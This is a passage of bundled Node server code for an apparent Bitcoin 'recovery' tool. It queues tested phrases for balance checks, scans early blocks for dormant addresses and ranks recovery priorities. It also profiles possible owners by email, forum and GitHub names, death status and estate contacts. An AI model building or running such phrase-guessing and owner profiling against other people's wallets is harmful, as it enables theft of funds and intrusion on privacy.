        };
      }
      /**
       * Trigger an immediate refresh
       */
      async triggerRefresh() {
        if (this.isCurrentlyRefreshing) {
          return { success: false, message: "Refresh already in progress." };
        }
        try {
          const result = await this.performRefresh();
          return {
            success: true,
            message: `Refreshed ${result.refreshed} addresses. ${result.changed} balance(s) changed.`,
            result: {
              total: result.total,
              refreshed: result.refreshed,
              changed: result.changed,
              errors: result.errors,
              duration: result.duration
            }
          };
        } catch (error) {
          return {
            success: false,
            message: `Refresh failed: ${error instanceof Error ? error.message : "Unknown error"}`
          };
        }
      }
      /**
       * Get the current status of the balance monitor
       */
      getStatus() {
        const balanceHits3 = getBalanceHits();
        const activeHits = getActiveBalanceHits();
        const staleHits = getStaleBalanceHits(this.state.refreshIntervalMinutes);
        const recentChanges = getBalanceChanges().slice(-10);
        return {
          enabled: this.state.enabled,
          isRefreshing: this.isCurrentlyRefreshing,
          refreshIntervalMinutes: this.state.refreshIntervalMinutes,
          lastRefreshTime: this.state.lastRefreshTime,
          lastRefreshResult: this.state.lastRefreshResult,
          totalRefreshes: this.state.totalRefreshes,
          monitoredAddresses: balanceHits3.length,
          activeAddresses: activeHits.length,
          staleAddresses: staleHits.length,
          recentChanges
        };
      }
    };
    balanceMonitor = new BalanceMonitor();
  }
});

// server/balance-queue-backfill.ts
var balance_queue_backfill_exports = {};
__export(balance_queue_backfill_exports, {
  getBackfillProgress: () => getBackfillProgress,
  getBackfillStats: () => getBackfillStats,
  startBackfill: () => startBackfill
});
import * as fs16 from "fs";
import * as path15 from "path";
function getTestedPhrases() {
  try {
    if (!fs16.existsSync(TESTED_PHRASES_FILE2)) {
      console.log("[Backfill] tested-phrases.json not found");
      return [];
    }
    const data = JSON.parse(fs16.readFileSync(TESTED_PHRASES_FILE2, "utf-8"));
    if (Array.isArray(data.phrases)) {
      console.log(`[Backfill] Found ${data.phrases.length} tested phrases`);
      return data.phrases;
    }
    return [];
  } catch (error) {
    console.error("[Backfill] Error reading tested phrases:", error);
    return [];
  }
}
function getProbeInputs() {
  try {
    if (!fs16.existsSync(GEOMETRIC_MEMORY_FILE)) {
      console.log("[Backfill] geometric-memory.json not found");
      return [];
    }
    const data = JSON.parse(fs16.readFileSync(GEOMETRIC_MEMORY_FILE, "utf-8"));
    if (data.probes && typeof data.probes === "object") {
      const inputs = [];
      for (const key of Object.keys(data.probes)) {
        const probe = data.probes[key];
        if (probe && probe.input && typeof probe.input === "string") {
          inputs.push(probe.input);
        }
      }
      console.log(`[Backfill] Found ${inputs.length} probe inputs`);
      return inputs;
    }
    return [];
  } catch (error) {
    console.error("[Backfill] Error reading probe inputs:", error);
    return [];
  }
}
async function startBackfill(options) {
  if (backfillProgress.status === "running") {
    console.log("[Backfill] Already running");
    return backfillProgress;
  }
  const source = options?.source || "tested-phrases";
  const batchSize = options?.batchSize || 100;
  const delayMs = options?.delayMs || 10;
  let phrases = [];
  if (source === "tested-phrases" || source === "both") {
    phrases = [...phrases, ...getTestedPhrases()];
  }
  if (source === "probes" || source === "both") {
    phrases = [...phrases, ...getProbeInputs()];
  }
  phrases = Array.from(new Set(phrases));
  if (phrases.length === 0) {
    return {
      totalPhrases: 0,
      queuedPhrases: 0,
      failedPhrases: 0,
      startTime: Date.now(),
      endTime: Date.now(),
      status: "completed",
      source,
      error: "No phrases found to backfill"
    };
  }
  backfillProgress = {
    totalPhrases: phrases.length,
    queuedPhrases: 0,
    failedPhrases: 0,
    startTime: Date.now(),
    status: "running",
    source
  };
  console.log(`[Backfill] Starting backfill of ${phrases.length} phrases from ${source}`);
  try {
    for (let i = 0; i < phrases.length; i += batchSize) {
      const batch = phrases.slice(i, i + batchSize);
      const result = batchQueueAddresses(batch, `backfill-${source}`, 1);
      backfillProgress.queuedPhrases += result.queued;
      backfillProgress.failedPhrases += result.failed;
      if ((i + batchSize) % 1e3 === 0 || i + batchSize >= phrases.length) {
        const pct = Math.round((i + batchSize) / phrases.length * 100);
        console.log(`[Backfill] Progress: ${pct}% (${backfillProgress.queuedPhrases} queued, ${backfillProgress.failedPhrases} failed)`);
      }
      if (delayMs > 0) {
        await new Promise((r) => setTimeout(r, delayMs));
      }
    }
    backfillProgress.status = "completed";
    backfillProgress.endTime = Date.now();
    const duration = (backfillProgress.endTime - backfillProgress.startTime) / 1e3;
    console.log(`[Backfill] Completed in ${duration.toFixed(1)}s: ${backfillProgress.queuedPhrases} queued, ${backfillProgress.failedPhrases} failed`);
  } catch (error) {
    backfillProgress.status = "failed";
    backfillProgress.error = error instanceof Error ? error.message : "Unknown error";
    backfillProgress.endTime = Date.now();
    console.error("[Backfill] Failed:", error);
  }
  return backfillProgress;
}
function getBackfillProgress() {
  return {
    ...backfillProgress,
    integrationStats: getQueueIntegrationStats()
  };
}
function getBackfillStats() {
  let testedPhrases = 0;
  let probeInputs = 0;
  try {
    if (fs16.existsSync(TESTED_PHRASES_FILE2)) {
      const data = JSON.parse(fs16.readFileSync(TESTED_PHRASES_FILE2, "utf-8"));
      testedPhrases = Array.isArray(data.phrases) ? data.phrases.length : 0;
    }
  } catch {
  }
  try {
    if (fs16.existsSync(GEOMETRIC_MEMORY_FILE)) {
      const data = JSON.parse(fs16.readFileSync(GEOMETRIC_MEMORY_FILE, "utf-8"));
      probeInputs = data.totalProbes || 0;
    }
  } catch {
  }
  return { testedPhrases, probeInputs };
}
var TESTED_PHRASES_FILE2, GEOMETRIC_MEMORY_FILE, backfillProgress;
var init_balance_queue_backfill = __esm({
  "server/balance-queue-backfill.ts"() {
    "use strict";
    init_balance_queue_integration();
    TESTED_PHRASES_FILE2 = path15.join(process.cwd(), "data", "tested-phrases.json");
    GEOMETRIC_MEMORY_FILE = path15.join(process.cwd(), "data", "geometric-memory.json");
    backfillProgress = {
      totalPhrases: 0,
      queuedPhrases: 0,
      failedPhrases: 0,
      startTime: 0,
      status: "idle",
      source: ""
    };
  }
});

// server/api-health.ts
var api_health_exports = {};
__export(api_health_exports, {
  healthCheckHandler: () => healthCheckHandler
});
import { sql as sql6 } from "drizzle-orm";
async function checkDatabaseHealth() {
  const start = Date.now();
  try {
    const { db: db2 } = await Promise.resolve().then(() => (init_db(), db_exports));
    if (!db2) {
      return {
        status: "down",
        message: "Database connection not initialized"
      };
    }
    await db2.execute(sql6`SELECT 1 as health_check`);
    const latency = Date.now() - start;
    return {
      status: "healthy",
      latency,
      message: "Database connection active"
    };
  } catch (error) {
    const latency = Date.now() - start;
    return {
      status: "down",
      latency,
      message: error instanceof Error ? error.message : "Database check failed"
    };
  }
}
async function checkPythonBackendHealth() {
  const start = Date.now();
  try {
    const { oceanQIGBackend: oceanQIGBackend2 } = await Promise.resolve().then(() => (init_ocean_qig_backend_adapter(), ocean_qig_backend_adapter_exports));
    const isHealthy = await oceanQIGBackend2.checkHealth();
    const latency = Date.now() - start;
    if (isHealthy) {
      return {
        status: "healthy",
        latency,
        message: "Python QIG backend responsive",
        details: {
          endpoint: "http://localhost:5001/health"
        }
      };
    } else {
      return {
        status: "degraded",
        latency,
        message: "Python backend not responding, using fallback"
      };
    }
  } catch (error) {
    const latency = Date.now() - start;
    return {
      status: "down",
      latency,
      message: error instanceof Error ? error.message : "Python backend check failed"
    };
  }
}
async function checkStorageHealth() {
  const start = Date.now();
  try {
    const { storage: storage2 } = await Promise.resolve().then(() => (init_storage(), storage_exports));
    if (storage2 && typeof storage2.getTargetAddresses === "function") {
      const latency = Date.now() - start;
      return {
        status: "healthy",
        latency,
        message: "Storage systems operational"
      };
    } else {
      return {
        status: "degraded",
        latency: Date.now() - start,
        message: "Storage system partially initialized"
      };
    }
  } catch (error) {
    const latency = Date.now() - start;
    return {
      status: "down",
      latency,
      message: error instanceof Error ? error.message : "Storage check failed"
    };
  }
}
async function healthCheckHandler(req, res) {
  const [database, pythonBackend, storage2] = await Promise.all([
    checkDatabaseHealth(),
    checkPythonBackendHealth(),
    checkStorageHealth()
  ]);
  let overallStatus = "healthy";
  if (database.status === "down" || storage2.status === "down") {
    overallStatus = "down";
  } else if (pythonBackend.status === "down") {
    overallStatus = "down";
  } else if (database.status === "degraded" || pythonBackend.status === "degraded" || storage2.status === "degraded") {
    overallStatus = "degraded";
  }
  const response = {
    status: overallStatus,
    timestamp: Date.now(),
    uptime: Date.now() - startTime,
    subsystems: {
      database,
      pythonBackend,
      storage: storage2
    },
    version: process.env.npm_package_version || "1.0.0"
  };
  const statusCode = overallStatus === "healthy" ? 200 : overallStatus === "degraded" ? 207 : 503;
  res.status(statusCode).json(response);
}
var startTime;
var init_api_health = __esm({
  "server/api-health.ts"() {
    "use strict";
    startTime = Date.now();
  }
});

// server/index.ts
import express2 from "express";
import helmet from "helmet";

// server/routes.ts
init_storage();
init_crypto();
init_qig_pure_v2();
import { createServer } from "http";
import rateLimit8 from "express-rate-limit";

// server/observer-routes.ts
init_blockchain_scanner();
init_observer_storage();
init_dormant_cross_ref();
import { Router as Router2 } from "express";
import { z as z4 } from "zod";
import { randomUUID as randomUUID5 } from "crypto";
var router2 = Router2();
var scanState = {
  isScanning: false,
  scanId: null,
  startHeight: 0,
  endHeight: 0,
  currentHeight: 0,
  totalBlocks: 0,
  startTime: null,
  addressesFound: 0,
  dormantAddresses: 0,
  error: null
};
function updateScanProgress(height, total, addressesFound = 0, dormantAddresses = 0) {
  scanState.currentHeight = height;
  scanState.totalBlocks = total;
  scanState.addressesFound += addressesFound;
  scanState.dormantAddresses += dormantAddresses;
}
function completeScan(error) {
  scanState.isScanning = false;
  scanState.error = error || null;
  if (!error) {
    console.log(`[ScanManager] Scan ${scanState.scanId} completed successfully`);
  }
}
router2.post("/scan/start", async (req, res) => {
  try {
    if (scanState.isScanning) {
      return res.status(409).json({
        error: "A scan is already in progress",
        scanId: scanState.scanId,
        currentHeight: scanState.currentHeight,
        totalBlocks: scanState.totalBlocks
      });
    }
    const schema = z4.object({
      startHeight: z4.number().min(0).default(0),
      endHeight: z4.number().min(1).default(1e3)
    });
    const { startHeight, endHeight } = schema.parse(req.body);
    if (endHeight <= startHeight) {
      return res.status(400).json({
        error: "endHeight must be greater than startHeight"
      });
    }
    const scanId = randomUUID5();
    scanState.isScanning = true;
    scanState.scanId = scanId;
    scanState.startHeight = startHeight;
    scanState.endHeight = endHeight;
    scanState.currentHeight = startHeight;
    scanState.totalBlocks = endHeight - startHeight;
    scanState.startTime = Date.now();
    scanState.addressesFound = 0;
    scanState.dormantAddresses = 0;
    scanState.error = null;
    scanEarlyEraBlocks(startHeight, endHeight, (height, total) => {
      updateScanProgress(height, total);
      console.log(`[ObserverAPI] Scanning progress: ${height}/${total}`);
    }).then(() => {
      console.log(`[ObserverAPI] Scan complete: ${startHeight}-${endHeight}`);
      completeScan();
    }).catch((error) => {
      console.error(`[ObserverAPI] Scan error:`, error);
      completeScan(error.message);
    });
    res.json({
      status: "started",
      scanId,
      startHeight,
      endHeight,
      totalBlocks: endHeight - startHeight,
      message: `Scanning blocks ${startHeight} to ${endHeight}`
    });
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});
router2.get("/scan/status", async (req, res) => {
  const elapsed = scanState.startTime ? Date.now() - scanState.startTime : 0;
  const progress = scanState.totalBlocks > 0 ? Math.round((scanState.currentHeight - scanState.startHeight) / scanState.totalBlocks * 100) : 0;
  const blocksScanned = scanState.currentHeight - scanState.startHeight;
  const blocksPerSecond = elapsed > 1e3 ? blocksScanned / (elapsed / 1e3) : 0;
  const remainingBlocks = scanState.totalBlocks - blocksScanned;
  const estimatedTimeRemaining = blocksPerSecond > 0 ? Math.round(remainingBlocks / blocksPerSecond) : null;
  res.json({
    isScanning: scanState.isScanning,
    scanId: scanState.scanId,
    startHeight: scanState.startHeight,
    endHeight: scanState.endHeight,
    currentHeight: scanState.currentHeight,
    totalBlocks: scanState.totalBlocks,
    blocksScanned,
    progress,
    addressesFound: scanState.addressesFound,
    dormantAddresses: scanState.dormantAddresses,
    elapsedMs: elapsed,
    blocksPerSecond: Math.round(blocksPerSecond * 100) / 100,
    estimatedTimeRemaining,
    error: scanState.error,
    message: scanState.isScanning ? `Scanning block ${scanState.currentHeight} of ${scanState.endHeight}` : scanState.error ? `Scan failed: ${scanState.error}` : scanState.scanId ? "Scan complete" : "No active scan"
  });
});
router2.get("/blocks/:height", async (req, res) => {
  try {
    const height = parseInt(req.params.height, 10);
    if (isNaN(height) || height < 0) {
      return res.status(400).json({ error: "Invalid block height" });
    }
    const blockData = await fetchBlockByHeight(height);
    if (!blockData) {
      return res.status(404).json({ error: "Block not found" });
    }
    const block = parseBlock(blockData);
    res.json({
      block,
      raw: blockData
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
router2.get("/addresses/dormant", async (req, res) => {
  try {
    const schema = z4.object({
      minBalance: z4.coerce.number().optional(),
      limit: z4.coerce.number().min(1).max(1e3).default(100),
      offset: z4.coerce.number().min(0).default(0)
    });
    let filters;
    try {
      filters = schema.parse(req.query);
    } catch (zodError) {
      return res.status(400).json({
        error: "Invalid query parameters",
        details: zodError.errors || zodError.message
      });
    }
    const allDormant = dormantCrossRef.getAllDormantAddresses(1e3);
    let filteredAddresses = allDormant;
    if (filters.minBalance !== void 0) {
      filteredAddresses = filteredAddresses.filter((addr) => {
        const balanceStr = addr.balanceBTC.replace(/,/g, "");
        const balance = parseFloat(balanceStr) || 0;
        return balance >= filters.minBalance;
      });
    }
    const total = filteredAddresses.length;
    const paginatedAddresses = filteredAddresses.slice(
      filters.offset,
      filters.offset + filters.limit
    );
    const parseDate2 = (dateStr) => {
      if (!dateStr) return /* @__PURE__ */ new Date("2010-01-01");
      const parsed = new Date(dateStr);
      return isNaN(parsed.getTime()) ? /* @__PURE__ */ new Date("2010-01-01") : parsed;
    };
    const calculateDormancy = (lastIn) => {
      const lastDate = parseDate2(lastIn);
      const now = /* @__PURE__ */ new Date();
      const dormancyMs = now.getTime() - lastDate.getTime();
      return dormancyMs / (1e3 * 60 * 60 * 24 * 365.25);
    };
    const extractBalance = (addr) => {
      let balanceStr = addr.balanceBTC?.replace(/,/g, "") || "";
      let balance = parseFloat(balanceStr) || 0;
      let usdStr = addr.balanceUSD || "";
      if (balance === 0 && addr.firstIn) {
        const btcMatch = addr.firstIn.match(/([\d,]+(?:\.\d+)?)\s*BTC/);
        const usdMatch = addr.firstIn.match(/\(\$([\d,]+(?:\.\d+)?)\)/);
        if (btcMatch) {
          balance = parseFloat(btcMatch[1].replace(/,/g, "")) || 0;
        }
        if (usdMatch) {
          usdStr = `$${usdMatch[1]}`;
        }
      }
      return { btc: balance, usd: usdStr };
    };
    const serializedAddresses = paginatedAddresses.map((addr) => {
      const balanceInfo = extractBalance(addr);
      const balance = balanceInfo.btc;
      const balanceUSD = balanceInfo.usd;
      const firstSeenDate = parseDate2(addr.firstIn);
      const lastSeenDate = parseDate2(addr.lastIn);
      const dormancyYears = calculateDormancy(addr.lastIn);
      const isEarlyEra = firstSeenDate.getFullYear() <= 2011;
      return {
        address: addr.address,
        balance: balance.toFixed(8),
        balanceUSD,
        firstSeenAt: firstSeenDate.toISOString(),
        lastSeenAt: lastSeenDate.toISOString(),
        dormancyYears,
        isEarlyEra,
        isCoinbaseReward: false,
        // Would need blockchain lookup to determine
        walletLabel: addr.walletLabel,
        rank: addr.rank,
        classification: addr.classification
      };
    });
    res.json({
      addresses: serializedAddresses,
      total,
      filters,
      message: `Found ${total} dormant address(es) from top known wallets`
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
router2.get("/addresses/:address", async (req, res) => {
  try {
    const { address } = req.params;
    if (address.length < 26 || address.length > 35) {
      return res.status(400).json({ error: "Invalid Bitcoin address format" });
    }
    const addressData = await observerStorage.getAddress(address);
    if (!addressData) {
      return res.status(404).json({
        error: "Address not found",
        message: "This address has not been cataloged yet. It may not exist in the scanned block range, or scanning has not been performed."
      });
    }
    const recovery = computeKappaRecovery(addressData);
    const serializedAddress = {
      ...addressData,
      currentBalance: addressData.currentBalance.toString(),
      createdAt: addressData.createdAt?.toISOString() || (/* @__PURE__ */ new Date()).toISOString(),
      updatedAt: addressData.updatedAt?.toISOString() || (/* @__PURE__ */ new Date()).toISOString(),
      firstSeenTimestamp: addressData.firstSeenTimestamp.toISOString(),
      lastActivityTimestamp: addressData.lastActivityTimestamp.toISOString(),
      recovery
    };
    res.json({
      address: serializedAddress,
      message: "Address details retrieved successfully"
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
router2.post("/entities", async (req, res) => {
  try {
    const schema = z4.object({
      name: z4.string().min(1).max(255),
      type: z4.enum(["person", "organization", "miner", "developer"]),
      aliases: z4.array(z4.string()).optional(),
      knownAddresses: z4.array(z4.string()).optional(),
      bitcoinTalkUsername: z4.string().max(100).optional(),
      githubUsername: z4.string().max(100).optional(),
      emailAddresses: z4.array(z4.string()).optional(),
      firstActivityDate: z4.coerce.date().optional(),
      lastActivityDate: z4.coerce.date().optional(),
      isDeceased: z4.boolean().optional(),
      estateContact: z4.string().max(500).optional(),
      metadata: z4.record(z4.any()).optional()
    });
    let entityData;
    try {
      entityData = schema.parse(req.body);
    } catch (zodError) {
      return res.status(400).json({
        error: "Invalid entity data",
        details: zodError.errors || zodError.message
      });
    }
    let existingEntity = null;
    if (entityData.bitcoinTalkUsername || entityData.githubUsername) {
      existingEntity = await observerStorage.findEntityByIdentity({
        bitcoinTalkUsername: entityData.bitcoinTalkUsername,
        githubUsername: entityData.githubUsername
      });
    }
    if (!existingEntity && entityData.emailAddresses && entityData.emailAddresses.length > 0) {
      for (const email of entityData.emailAddresses) {
        existingEntity = await observerStorage.findEntityByIdentity({ email });
        if (existingEntity) break;
      }
    }
    if (existingEntity) {
      const updates = {};
      if (entityData.name && entityData.name !== existingEntity.name) {
        updates.name = entityData.name;
      }
      if (entityData.aliases) {
        const mergedAliases = Array.from(/* @__PURE__ */ new Set([
          ...existingEntity.aliases || [],
          ...entityData.aliases
        ]));
        updates.aliases = mergedAliases;
      }
      if (entityData.knownAddresses) {
        const mergedAddresses = Array.from(/* @__PURE__ */ new Set([
          ...existingEntity.knownAddresses || [],
          ...entityData.knownAddresses
        ]));
        updates.knownAddresses = mergedAddresses;
      }
      if (entityData.emailAddresses) {
        const mergedEmails = Array.from(/* @__PURE__ */ new Set([
          ...existingEntity.emailAddresses || [],
          ...entityData.emailAddresses
        ]));
        updates.emailAddresses = mergedEmails;
      }
      if (entityData.bitcoinTalkUsername && !existingEntity.bitcoinTalkUsername) {
        updates.bitcoinTalkUsername = entityData.bitcoinTalkUsername;
      }
      if (entityData.githubUsername && !existingEntity.githubUsername) {
        updates.githubUsername = entityData.githubUsername;
      }
      if (entityData.firstActivityDate) {
        updates.firstActivityDate = existingEntity.firstActivityDate ? entityData.firstActivityDate < existingEntity.firstActivityDate ? entityData.firstActivityDate : existingEntity.firstActivityDate : entityData.firstActivityDate;
      }
      if (entityData.lastActivityDate) {
        updates.lastActivityDate = existingEntity.lastActivityDate ? entityData.lastActivityDate > existingEntity.lastActivityDate ? entityData.lastActivityDate : existingEntity.lastActivityDate : entityData.lastActivityDate;
      }
      if (entityData.isDeceased !== void 0) {
        updates.isDeceased = entityData.isDeceased;
      }
      if (entityData.estateContact) {
        updates.estateContact = entityData.estateContact;
      }
      if (entityData.metadata) {
        updates.metadata = {
          ...existingEntity.metadata || {},
          ...entityData.metadata
        };
      }
      await observerStorage.updateEntity(existingEntity.id, updates);
      const updatedEntity = await observerStorage.getEntity(existingEntity.id);
      return res.status(200).json({
        entity: updatedEntity,
        message: `Entity '${updatedEntity?.name}' updated successfully (matched by identity)`,
        action: "updated"
      });
    }
    const savedEntity = await observerStorage.saveEntity({
      id: void 0,
      // Let database generate UUID
      name: entityData.name,
      type: entityData.type,
      aliases: entityData.aliases || null,
      knownAddresses: entityData.knownAddresses || null,
      bitcoinTalkUsername: entityData.bitcoinTalkUsername || null,
      githubUsername: entityData.githubUsername || null,
      emailAddresses: entityData.emailAddresses || null,
      firstActivityDate: entityData.firstActivityDate || null,
      lastActivityDate: entityData.lastActivityDate || null,
      isDeceased: entityData.isDeceased || false,
      estateContact: entityData.estateContact || null,
      metadata: entityData.metadata || null
    });
    res.status(201).json({
      entity: savedEntity,
      message: `Entity '${savedEntity.name}' created successfully`,
      action: "created"
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
router2.get("/entities", async (req, res) => {
  try {
    const schema = z4.object({
      name: z4.string().optional(),
      type: z4.enum(["person", "organization", "miner", "developer"]).optional(),
      bitcoinTalkUsername: z4.string().optional(),
      githubUsername: z4.string().optional(),
      email: z4.string().optional(),
      alias: z4.string().optional(),
      limit: z4.coerce.number().min(1).max(1e3).default(100),
      offset: z4.coerce.number().min(0).default(0)
    });
    let filters;
    try {
      filters = schema.parse(req.query);
    } catch (zodError) {
      return res.status(400).json({
        error: "Invalid query parameters",
        details: zodError.errors || zodError.message
      });
    }
    const entities2 = await observerStorage.searchEntities({
      name: filters.name,
      type: filters.type,
      bitcoinTalkUsername: filters.bitcoinTalkUsername,
      githubUsername: filters.githubUsername,
      email: filters.email,
      alias: filters.alias,
      limit: filters.limit,
      offset: filters.offset
    });
    res.json({
      entities: entities2,
      total: entities2.length,
      filters,
      message: entities2.length === 0 ? "No entities found. Create entities via POST /api/observer/entities or adjust your search filters." : `Found ${entities2.length} entit${entities2.length === 1 ? "y" : "ies"}`
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
router2.get("/entities/:id", async (req, res) => {
  try {
    const { id } = req.params;
    const entity = await observerStorage.getEntity(id);
    if (!entity) {
      return res.status(404).json({
        error: "Entity not found",
        message: `No entity with ID '${id}' exists in the database.`
      });
    }
    res.json({
      entity,
      message: "Entity retrieved successfully"
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
router2.post("/artifacts", async (req, res) => {
  try {
    const schema = z4.object({
      type: z4.enum(["forum_post", "mailing_list", "code_commit", "news"]),
      source: z4.enum(["bitcointalk", "cryptography_ml", "github", "sourceforge", "bitcoin_ml", "other"]),
      title: z4.string().max(500).optional(),
      content: z4.string().optional(),
      author: z4.string().max(255).optional(),
      timestamp: z4.coerce.date().optional(),
      entityId: z4.string().optional(),
      relatedAddresses: z4.array(z4.string()).optional(),
      url: z4.string().max(1e3).optional(),
      metadata: z4.record(z4.any()).optional()
    });
    let artifactData;
    try {
      artifactData = schema.parse(req.body);
    } catch (zodError) {
      return res.status(400).json({
        error: "Invalid artifact data",
        details: zodError.errors || zodError.message
      });
    }
    if (artifactData.entityId) {
      const entity = await observerStorage.getEntity(artifactData.entityId);
      if (!entity) {
        return res.status(400).json({
          error: "Entity not found",
          message: `No entity with ID '${artifactData.entityId}' exists. Create the entity first via POST /api/observer/entities.`
        });
      }
    }
    let linkedEntityId = artifactData.entityId;
    let autoLinked = false;
    if (!linkedEntityId && artifactData.author) {
      const identity = {};
      if (artifactData.source === "bitcointalk") {
        identity.bitcoinTalkUsername = artifactData.author;
      } else if (artifactData.source === "github" || artifactData.source === "sourceforge") {
        identity.githubUsername = artifactData.author;
      }
      if (Object.keys(identity).length > 0) {
        const matchedEntity = await observerStorage.findEntityByIdentity(identity);
        if (matchedEntity) {
          linkedEntityId = matchedEntity.id;
          autoLinked = true;
        }
      }
    }
    const savedArtifact = await observerStorage.saveArtifact({
      id: void 0,
      // Let database generate UUID
      type: artifactData.type,
      source: artifactData.source,
      title: artifactData.title || null,
      content: artifactData.content || null,
      author: artifactData.author || null,
      timestamp: artifactData.timestamp || null,
      entityId: linkedEntityId || null,
      relatedAddresses: artifactData.relatedAddresses || null,
      url: artifactData.url || null,
      metadata: artifactData.metadata || null
    });
    res.status(201).json({
      artifact: savedArtifact,
      message: `Artifact '${savedArtifact.type}' from '${savedArtifact.source}' ingested successfully${autoLinked ? " (auto-linked to entity)" : ""}`,
      autoLinked
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
router2.get("/artifacts", async (req, res) => {
  try {
    const schema = z4.object({
      entityId: z4.string().optional(),
      source: z4.string().optional(),
      type: z4.enum(["forum_post", "mailing_list", "code_commit", "news"]).optional(),
      limit: z4.coerce.number().min(1).max(1e3).default(100),
      offset: z4.coerce.number().min(0).default(0)
    });
    let filters;
    try {
      filters = schema.parse(req.query);
    } catch (zodError) {
      return res.status(400).json({
        error: "Invalid query parameters",
        details: zodError.errors || zodError.message
      });
    }
    const artifacts2 = await observerStorage.getArtifacts({
      entityId: filters.entityId,
      source: filters.source
    });
    let filteredArtifacts = artifacts2;
    if (filters.type) {
      filteredArtifacts = filteredArtifacts.filter((a) => a.type === filters.type);
    }
    const paginatedArtifacts = filteredArtifacts.slice(filters.offset, filters.offset + filters.limit);
    res.json({
      artifacts: paginatedArtifacts,
      total: filteredArtifacts.length,
      filters,
      message: paginatedArtifacts.length === 0 ? "No artifacts found. Ingest artifacts via POST /api/observer/artifacts." : `Found ${paginatedArtifacts.length} artifact${paginatedArtifacts.length === 1 ? "" : "s"}`
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
router2.get("/priorities", async (req, res) => {
  try {
    const schema = z4.object({
      tier: z4.enum(["high", "medium", "low", "challenging"]).optional(),
      minKappa: z4.coerce.number().optional(),
      limit: z4.coerce.number().min(1).max(1e3).default(100),
      offset: z4.coerce.number().min(0).default(0)
    });
    const filters = schema.parse(req.query);
    const priorities = await observerStorage.getRecoveryPriorities({
      minKappa: filters.minKappa,
      limit: filters.limit,
      offset: filters.offset
    });
    res.json({
      priorities,
      total: priorities.length,
      filters,
      message: priorities.length === 0 ? "No recovery priorities found. Run scanning and constraint solver first." : `Found ${priorities.length} priorit${priorities.length === 1 ? "y" : "ies"}`
    });
  } catch (error) {
    if (error.name === "ZodError") {
      res.status(400).json({ error: error.message });
    } else {
      console.error("[ObserverAPI] Priorities error:", error);
      res.status(500).json({ error: error.message });
    }
  }
});
router2.get("/priorities/:address", async (req, res) => {
  try {
    const { address } = req.params;
    const priority = await observerStorage.getRecoveryPriority(address);
    if (!priority) {
      return res.status(404).json({
        error: "Priority not found",
        address,
        message: "No recovery priority computed for this address. Run the constraint solver first."
      });
    }
    res.json({
      priority,
      message: "Recovery priority retrieved successfully"
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
router2.get("/workflows", async (req, res) => {
  try {
    const schema = z4.object({
      vector: z4.enum(["estate", "constrained_search", "social", "temporal"]).optional(),
      status: z4.enum(["pending", "active", "paused", "completed", "failed"]).optional(),
      limit: z4.coerce.number().min(1).max(1e3).default(100),
      offset: z4.coerce.number().min(0).default(0)
    });
    const filters = schema.parse(req.query);
    const workflows = await observerStorage.getRecoveryWorkflows({
      vector: filters.vector,
      status: filters.status
    });
    const paginatedWorkflows = workflows.slice(filters.offset, filters.offset + filters.limit);
    res.json({
      workflows: paginatedWorkflows,
      total: workflows.length,
      filters,
      message: paginatedWorkflows.length === 0 ? "No recovery workflows found." : `Found ${paginatedWorkflows.length} workflow${paginatedWorkflows.length === 1 ? "" : "s"}`
    });
  } catch (error) {
    if (error.name === "ZodError") {
      res.status(400).json({ error: error.message });
    } else {
      console.error("[ObserverAPI] Workflows error:", error);
      res.status(500).json({ error: error.message });
    }
  }
});
router2.post("/workflows", async (req, res) => {
  try {
    const schema = z4.object({
      address: z4.string().min(26).max(35),
      vector: z4.enum(["estate", "constrained_search", "social", "temporal"]),
      priority: z4.string().optional()
    });
    const data = schema.parse(req.body);
    const workflow = await observerStorage.saveRecoveryWorkflow({
      id: randomUUID5(),
      address: data.address,
      vector: data.vector,
      status: "pending",
      priorityId: data.priority || "",
      progress: null,
      results: null,
      startedAt: null,
      completedAt: null,
      notes: null
    });
    res.json({
      workflow,
      message: "Workflow created successfully"
    });
  } catch (error) {
    if (error.name === "ZodError") {
      res.status(400).json({ error: error.message });
    } else {
      console.error("[ObserverAPI] Workflow creation error:", error);
      res.status(500).json({ error: error.message });
    }
  }
});
router2.get("/workflows/:id", async (req, res) => {
  try {
    const { id } = req.params;
    const workflow = await observerStorage.getRecoveryWorkflow(id);
    if (!workflow) {
      return res.status(404).json({
        error: "Workflow not found",
        id,
        message: "No workflow found with this ID."
      });
    }
    res.json({
      workflow,
      message: "Workflow retrieved successfully"
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
router2.get("/entities", async (req, res) => {
  try {
    const schema = z4.object({
      type: z4.enum(["person", "organization", "miner", "developer"]).optional(),
      limit: z4.coerce.number().min(1).max(1e3).default(100),
      offset: z4.coerce.number().min(0).default(0)
    });
    const filters = schema.parse(req.query);
    const entities2 = await observerStorage.getEntities(filters.type);
    const paginatedEntities = entities2.slice(filters.offset, filters.offset + filters.limit);
    res.json({
      entities: paginatedEntities,
      total: entities2.length,
      filters,
      message: paginatedEntities.length === 0 ? "No entities found. Ingest entity data via POST /api/observer/entities." : `Found ${paginatedEntities.length} entit${paginatedEntities.length === 1 ? "y" : "ies"}`
    });
  } catch (error) {
    if (error.name === "ZodError") {
      res.status(400).json({ error: error.message });
    } else {
      console.error("[ObserverAPI] Entities error:", error);
      res.status(500).json({ error: error.message });
    }
  }
});
router2.get("/artifacts", async (req, res) => {
  try {
    const schema = z4.object({
      type: z4.enum(["forum_post", "mailing_list", "code_commit", "news"]).optional(),
      source: z4.string().optional(),
      limit: z4.coerce.number().min(1).max(1e3).default(100),
      offset: z4.coerce.number().min(0).default(0)
    });
    const filters = schema.parse(req.query);
    const artifacts2 = await observerStorage.getArtifacts({ source: filters.source });
    const paginatedArtifacts = artifacts2.slice(filters.offset, filters.offset + filters.limit);
    res.json({
      artifacts: paginatedArtifacts,
      total: artifacts2.length,
      filters,
